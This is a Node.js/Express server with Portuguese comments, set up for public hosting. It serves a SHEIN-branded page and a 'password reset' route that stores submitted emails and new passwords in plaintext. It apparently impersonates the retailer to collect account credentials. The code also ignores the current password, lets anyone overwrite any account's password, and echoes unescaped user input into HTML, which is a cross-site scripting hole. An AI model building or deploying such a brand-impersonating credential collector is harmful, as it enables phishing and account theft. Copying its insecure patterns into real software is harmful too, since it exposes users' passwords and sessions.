const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const path = require('path');

const app = express();

// --- AJUSTE PARA O RENDER ---
// Usa a porta que o Render fornecer na internet. Se estiver no PC, usa a 3000.
const PORT = process.env.PORT || 3000;

// Configuração para ler os dados enviados pelo formulário HTML
app.use(bodyParser.urlencoded({ extended: true }));

// ROTA PRINCIPAL: Abre diretamente o seu arquivo shein.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'shein.html'));
});

// Permite o uso de outros arquivos estáticos na mesma pasta
app.use(express.static(__dirname));

// --- CONFIGURAÇÃO DO BANCO DE DADOS ---
// Cria ou conecta ao arquivo 'loja.db' no seu VS Code
const db = new sqlite3.Database('./loja.db', (err) => {
    if (err) {
        console.error('Erro ao conectar ao banco:', err.message);
    } else {
        console.log('Conectado ao banco de dados SQLite da SHEIN.');
    }
});

// Cria a tabela de usuários caso ela ainda não exista
db.run(`CREATE TABLE IF NOT EXISTS usuarios (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT UNIQUE,
    senha TEXT
)`);

// --- ROTA QUE RECEBE OS DADOS DO FORMULÁRIO ---
app.post('/redefinir-senha', (req, res) => {
    const { email, senhaAtual, novaSenha } = req.body;

    // Busca se o e-mail digitado já existe no banco de dados
    db.get(`SELECT * FROM usuarios WHERE email = ?`, [email], (err, row) => {
        if (err) {
            return res.status(500).send("Erro ao consultar o banco de dados.");
        }

        if (!row) {
            // SE O USUÁRIO NÃO EXISTIR: Cadastra ele direto (perfeito para seu teste)
            db.run(`INSERT INTO usuarios (email, senha) VALUES (?, ?)`, [email, novaSenha], function(err) {
                if (err) return res.send("Erro ao cadastrar novo usuário.");
                
                res.send(`
                    <div style="font-family: Arial, sans-serif; text-align: center; margin-top: 50px;">
                        <h2 style="color: #2ecc71;">Conta criada com sucesso no Banco!</h2>
                        <p>Como esse e-mail não existia, nós o cadastramos automaticamente.</p>
                        <p><strong>E-mail:</strong> ${email}</p>
                        <p><strong>Senha Salva:</strong> ${novaSenha}</p>
                        <br><a href="/" style="color: black; font-weight: bold; text-decoration: none; border: 1px solid black; padding: 10px 20px;">Voltar para a SHEIN</a>
                    </div>
                `);
            });
        } else {
            // SE O USUÁRIO JÁ EXISTIR: Atualiza a senha dele no banco
            db.run(`UPDATE usuarios SET senha = ? WHERE email = ?`, [novaSenha, email], function(err) {
                if (err) return res.send("Erro ao atualizar a senha no banco.");
                
                res.send(`
                    <div style="font-family: Arial, sans-serif; text-align: center; margin-top: 50px;">
                        <h2 style="color: #3498db;">Senha alterada com sucesso!</h2>
                        <p>A senha do usuário <strong>${email}</strong> foi atualizada no banco de dados.</p>
                        <br><a href="/" style="color: black; font-weight: bold; text-decoration: none; border: 1px solid black; padding: 10px 20px;">Voltar para a SHEIN</a>
                    </div>
                `);
            });
        }
    });
});

// --- AJUSTE PARA O RENDER ---
// Inicia o servidor na porta correta (PORT)
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});